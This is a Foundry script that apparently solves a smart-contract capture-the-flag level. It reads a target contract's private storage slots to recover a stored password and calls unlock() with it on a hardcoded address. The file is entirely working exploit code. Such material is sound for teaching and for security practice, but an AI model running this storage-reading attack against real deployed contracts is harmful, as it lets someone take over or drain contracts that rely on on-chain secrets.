// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract Solve is Script, Test {
  address payable target = payable(0xeefBCAD1dfB825e24884C1A3eAEEc517e1f72CaB);
  using stdStorage for StdStorage;

  function run() public {
    vm.startBroadcast();

    bytes32 first32 = vm.load(address(target), bytes32(abi.encode(0)));
    emit log_named_bytes("First 32 bytes", abi.encode(first32));

    bytes32 second32 = vm.load(address(target), bytes32(abi.encode(1)));
    emit log_named_bytes("Second 32 bytes", abi.encode(second32));

    bytes32 passwordHash = second32;
    (bool success, ) = target.call(abi.encodeWithSignature("unlock(bytes32)", passwordHash));
    require(success, "Call to unlock() failed");
    (, bytes memory data) = target.call(abi.encodeWithSignature("locked()"));
    emit log_bytes(data);

    bool unlocked = abi.decode(data, (bool));
    require(!unlocked, "Still locked");

    vm.stopBroadcast();
  }
}
